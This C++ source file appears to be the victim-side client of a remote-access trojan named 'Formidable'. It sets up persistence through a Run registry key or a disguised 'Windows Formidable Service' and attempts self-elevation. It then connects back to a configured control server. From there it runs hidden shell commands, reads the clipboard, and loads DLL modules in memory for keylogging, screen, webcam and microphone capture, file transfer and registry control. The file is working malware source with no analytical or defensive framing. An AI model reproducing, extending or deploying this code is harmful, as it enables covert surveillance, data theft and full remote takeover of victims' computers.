#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <vector>
#include <string>
#include <map>
#include <ctime>
#include "../Common/Config.h"
#include "../Common/Module.h"
#include "../Common/Utils.h"
#include "../Common/MemoryModule.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "shell32.lib")

using namespace Formidable;

// 全局上线配置
CONNECT_ADDRESS g_ServerConfig = DEFAULT_CONFIG;

// 模块缓存
HMEMORYMODULE g_hTerminalModule = NULL;
PFN_MODULE_ENTRY g_pTerminalEntry = NULL;
HMEMORYMODULE g_hMultimediaModule = NULL;
PFN_MODULE_ENTRY g_pMultimediaEntry = NULL;
std::map<uint32_t, HMEMORYMODULE> g_ModuleCache;
std::map<uint32_t, PFN_MODULE_ENTRY> g_ModuleEntryCache;

// 安装与自启动
void InstallClient() {
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    // 1. 注册表启动
    if (g_ServerConfig.iStartup == 1) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"FormidableClient", 0, REG_SZ, (BYTE*)szPath, (DWORD)(wcslen(szPath) * 2 + 2));
            RegCloseKey(hKey);
        }
    } 
    // 2. 服务启动
    else if (g_ServerConfig.iStartup == 2) {
        SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (hSCM) {
            SC_HANDLE hService = CreateServiceW(
                hSCM, L"FormidableService", L"Windows Formidable Service",
                SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
                szPath, NULL, NULL, NULL, NULL, NULL);
            if (hService) {
                StartServiceW(hService, 0, NULL);
                CloseServiceHandle(hService);
            }
            CloseServiceHandle(hSCM);
        }
    }
}

// 获取基本信息
void GetClientInfo(ClientInfo& info) {
    memset(&info, 0, sizeof(ClientInfo));
    
    // 基础系统信息
    std::string os = GetOSVersion();
    int bits = GetOSBits();
    if (bits == 64) os += " x64";
    else os += " x86";
    strncpy(info.osVersion, os.c_str(), sizeof(info.osVersion) - 1);
    wchar_t wBuf[MAX_PATH];
    DWORD size = MAX_PATH;
    if (GetComputerNameW(wBuf, &size)) {
        std::string utf8 = WideToUTF8(wBuf);
        strncpy(info.computerName, utf8.c_str(), sizeof(info.computerName) - 1);
    }
    
    size = MAX_PATH;
    if (GetUserNameW(wBuf, &size)) {
        std::string utf8 = WideToUTF8(wBuf);
        strncpy(info.userName, utf8.c_str(), sizeof(info.userName) - 1);
    }
    // 硬件与进程信息
    std::string cpu = GetCpuBrand();
    strncpy(info.cpuInfo, cpu.c_str(), sizeof(info.cpuInfo) - 1);
    
    strncpy(info.lanAddr, GetLocalIP().c_str(), sizeof(info.lanAddr) - 1);
    
    info.processID = GetCurrentProcessId();
    info.is64Bit = (bits == 64);
    info.isAdmin = IsAdmin() ? 1 : 0;
    info.clientType = g_ServerConfig.iType; // 默认被控端类型
    
    // 活动窗口
    std::string activeWin = ActivityMonitor::GetStatus();
    strncpy(info.activeWindow, activeWin.c_str(), sizeof(info.activeWindow) - 1);
    
    // 版本与安装时间
    strncpy(info.version, GetExeVersion().c_str(), sizeof(info.version) - 1);
    strncpy(info.installTime, GetProcessStartTime().c_str(), sizeof(info.installTime) - 1);
    strncpy(info.uptime, GetSystemUptime().c_str(), sizeof(info.uptime) - 1);
}

std::string GetClipboardText() {
    std::string result;
    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
        if (hData) {
            wchar_t* pText = (wchar_t*)GlobalLock(hData);
            if (pText) {
                result = WideToUTF8(pText);
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    }
    return result;
}

void SetClipboardText(const std::string& text) {
    if (OpenClipboard(NULL)) {
        EmptyClipboard();
        std::wstring wText = UTF8ToWide(text);
        size_t size = (wText.size() + 1) * sizeof(wchar_t);
        HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, size);
        if (hGlobal) {
            void* p = GlobalLock(hGlobal);
            if (p) {
                memcpy(p, wText.c_str(), size);
                GlobalUnlock(hGlobal);
                SetClipboardData(CF_UNICODETEXT, hGlobal);
            }
        }
        CloseClipboard();
    }
}
// 内存加载 DLL 并执行导出函数
uint32_t GetModuleKey(uint32_t cmd) {
    switch (cmd) {
        case CMD_PROCESS_LIST:
        case CMD_PROCESS_KILL:
            return CMD_PROCESS_LIST;
        case CMD_WINDOW_LIST:
        case CMD_WINDOW_CTRL:
            return CMD_WINDOW_LIST;
        case CMD_FILE_LIST:
        case CMD_FILE_DOWNLOAD:
        case CMD_FILE_DOWNLOAD_DIR:
        case CMD_FILE_UPLOAD:
        case CMD_FILE_DELETE:
        case CMD_FILE_RENAME:
        case CMD_FILE_RUN:
            return CMD_FILE_LIST;
        case CMD_SERVICE_LIST:
            return CMD_SERVICE_LIST;
        case CMD_REGISTRY_CTRL:
            return CMD_REGISTRY_CTRL;
        case CMD_GET_SYSINFO:
            return CMD_GET_SYSINFO;
    }
    return 0;
}
void LoadModuleFromMemory(SOCKET s, CommandPkg* pkg, int totalDataLen) {
    bool hasDll = totalDataLen > (int)sizeof(CommandPkg);
    // 1. 终端模块缓存处理
    if (pkg->cmd == CMD_TERMINAL_OPEN) {
        if (g_hTerminalModule) {
            if (g_pTerminalEntry) {
                 CommandPkg closePkg = { CMD_TERMINAL_CLOSE, 0, 0 };
                 g_pTerminalEntry(s, &closePkg);
            }
            MemoryFreeLibrary(g_hTerminalModule);
            g_hTerminalModule = NULL;
            g_pTerminalEntry = NULL;
        }
    }
    
    // 2. 多媒体模块缓存处理 (Screen, Video, Voice, Keylog)
    bool isMultimedia = (pkg->cmd == CMD_SCREEN_CAPTURE || pkg->cmd == CMD_VIDEO_STREAM || 
                         pkg->cmd == CMD_VOICE_STREAM || pkg->cmd == CMD_KEYLOG);

    if (isMultimedia && g_hMultimediaModule) {
        // 如果多媒体模块已加载，直接调用入口
        if (g_pMultimediaEntry) {
            if (hasDll) {
                pkg->arg1 = pkg->arg2;
            }
            g_pMultimediaEntry(s, pkg);
        }
        return;
    }

    if (pkg->cmd == CMD_LOAD_MODULE && pkg->arg2 != 0) {
        uint32_t moduleKey = pkg->arg2;
        uint32_t dllSize = pkg->arg1;
        if (dllSize == 0) return;
        char* dllData = pkg->data;
        HMEMORYMODULE hMod = MemoryLoadLibrary(dllData, dllSize);
        if (hMod) {
            PFN_MODULE_ENTRY pEntry = (PFN_MODULE_ENTRY)MemoryGetProcAddress(hMod, "ModuleEntry");
            if (pEntry) {
                auto it = g_ModuleCache.find(moduleKey);
                if (it != g_ModuleCache.end()) {
                    MemoryFreeLibrary(it->second);
                }
                g_ModuleCache[moduleKey] = hMod;
                g_ModuleEntryCache[moduleKey] = pEntry;

                // 立即执行一次命令
                CommandPkg runPkg = *pkg;
                runPkg.cmd = moduleKey;
                runPkg.arg1 = 0;
                runPkg.arg2 = 0;
                pEntry(s, &runPkg);

                return;
            }
            MemoryFreeLibrary(hMod);
        }
        return;
    }

    uint32_t dllSize = pkg->arg1;
    char* dllData = pkg->data;
    
    if (dllSize == 0) return;

    // 使用 MemoryModule 直接在内存中加载 DLL，无需释放文件
    HMEMORYMODULE hMod = MemoryLoadLibrary(dllData, dllSize);
    if (hMod) {
        PFN_MODULE_ENTRY pEntry = (PFN_MODULE_ENTRY)MemoryGetProcAddress(hMod, "ModuleEntry");
        if (pEntry) {
            if (isMultimedia && hasDll) {
                pkg->arg1 = pkg->arg2;
            }
            pEntry(s, pkg);
            
            // 如果是终端模块，需要常驻内存
            if (pkg->cmd == CMD_TERMINAL_OPEN) {
                g_hTerminalModule = hMod;
                g_pTerminalEntry = pEntry;
                return; 
            }
            // 如果是多媒体模块，也需要常驻内存 (因为有线程)
            if (isMultimedia) {
                g_hMultimediaModule = hMod;
                g_pMultimediaEntry = pEntry;
                return;
            }
            uint32_t moduleKey = GetModuleKey(pkg->cmd);
            if (moduleKey != 0) {
                auto it = g_ModuleCache.find(moduleKey);
                if (it != g_ModuleCache.end()) {
                    MemoryFreeLibrary(it->second);
                }
                g_ModuleCache[moduleKey] = hMod;
                g_ModuleEntryCache[moduleKey] = pEntry;
                return;
            }
        }
        MemoryFreeLibrary(hMod);
    }
}
void SendPkg(SOCKET s, const void* data, int len) {
    PkgHeader header;
    memcpy(header.flag, "FRMD26?", 7);
    header.originLen = len;
    header.totalLen = sizeof(PkgHeader) + len;
    send(s, (char*)&header, sizeof(PkgHeader), 0);
    send(s, (char*)data, len, 0);
}

void HandleCommand(SOCKET s, CommandPkg* pkg, int totalDataLen) {
    switch (pkg->cmd) {
        case CMD_HEARTBEAT: {
            ClientInfo info;
            GetClientInfo(info);
            
            size_t bodySize = sizeof(CommandPkg) - 1 + sizeof(ClientInfo);
            std::vector<char> buffer(bodySize);
            CommandPkg* pkgResp = (CommandPkg*)buffer.data();
            pkgResp->cmd = CMD_HEARTBEAT;
            pkgResp->arg1 = sizeof(ClientInfo);
            pkgResp->arg2 = 0;
            memcpy(pkgResp->data, &info, sizeof(ClientInfo));
            
            SendPkg(s, buffer.data(), (int)bodySize);
            break;
        }
        case CMD_SHELL_EXEC:
            WinExec(pkg->data, SW_HIDE);
            break;
        case CMD_CLIPBOARD_GET: {
            std::string text = GetClipboardText();
            size_t bodySize = sizeof(CommandPkg) - 1 + text.size();
            std::vector<char> buffer(bodySize);
            CommandPkg* pkgResp = (CommandPkg*)buffer.data();
            pkgResp->cmd = CMD_CLIPBOARD_GET;
            pkgResp->arg1 = (uint32_t)text.size();
            pkgResp->arg2 = 0;
            memcpy(pkgResp->data, text.c_str(), text.size());
            SendPkg(s, buffer.data(), (int)bodySize);
            break;
        }
        case CMD_CLIPBOARD_SET:
            SetClipboardText(pkg->data);
            break;
        case CMD_TERMINAL_OPEN:
            LoadModuleFromMemory(s, pkg, totalDataLen);
            break;
        case CMD_TERMINAL_DATA:
            if (g_pTerminalEntry) {
                g_pTerminalEntry(s, pkg);
            }
            break;
        case CMD_TERMINAL_CLOSE:
            if (g_pTerminalEntry) {
                g_pTerminalEntry(s, pkg);
                if (g_hTerminalModule) {
                    MemoryFreeLibrary(g_hTerminalModule);
                    g_hTerminalModule = NULL;
                    g_pTerminalEntry = NULL;
                }
            }
            break;
        case CMD_LOAD_MODULE:
            LoadModuleFromMemory(s, pkg, totalDataLen);
            break;
        case CMD_GET_SYSINFO:
        case CMD_FILE_LIST:
        case CMD_FILE_DOWNLOAD_DIR:
        case CMD_PROCESS_LIST:
        case CMD_PROCESS_KILL:
        case CMD_WINDOW_LIST:
        case CMD_WINDOW_CTRL:
        case CMD_SERVICE_LIST:
        case CMD_REGISTRY_CTRL: {
            uint32_t moduleKey = GetModuleKey(pkg->cmd);
            auto it = g_ModuleEntryCache.find(moduleKey);
            if (it != g_ModuleEntryCache.end()) {
                it->second(s, pkg);
                break;
            }
            // 修复：终端模块未加载时的错误处理
            OutputDebugStringA("[ERROR] 模块未找到！请检查模块是否正确加载\n");
            LoadModuleFromMemory(s, pkg, totalDataLen);
            break;
        }
        case CMD_SCREEN_CAPTURE:
        case CMD_VOICE_STREAM:
        case CMD_VIDEO_STREAM:
        case CMD_KEYLOG:
            LoadModuleFromMemory(s, pkg, totalDataLen);
            break;
        case CMD_EXIT:
            ExitProcess(0);
            break;
    }
}
void ClientMain() {
    // 尝试提权运行
    if (g_ServerConfig.runasAdmin == 1) {
        if (!SelfElevate()) {
            ExitProcess(0);
            return;
        }
    }

    InstallClient(); // 执行安装/自启动
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    while (true) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
            Sleep(10000);
            continue;
        }
        sockaddr_in addr = { 0 };
        addr.sin_family = AF_INET;
        addr.sin_port = htons(atoi(g_ServerConfig.szPort));
        addr.sin_addr.s_addr = inet_addr(g_ServerConfig.szServerIP);
        if (connect(s, (sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
            ClientInfo info;
            GetClientInfo(info);
            SendPkg(s, &info, sizeof(ClientInfo));
            while (true) {
                PkgHeader header;
                int n = recv(s, (char*)&header, sizeof(PkgHeader), 0);
                if (n <= 0) break;
                std::vector<char> body(header.originLen);
                int total = 0;
                while (total < header.originLen) {
                    int r = recv(s, body.data() + total, header.originLen - total, 0);
                    if (r <= 0) break;
                    total += r;
                }
                
                if (total == header.originLen) {
                    HandleCommand(s, (CommandPkg*)body.data(), header.originLen);
                }
            }
        }
        closesocket(s);
        Sleep(10000);
    }
}
#ifndef _DEBUG
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ClientMain();
    return 0;
}
#else
int main() {
    ClientMain();
    return 0;
}
#endif
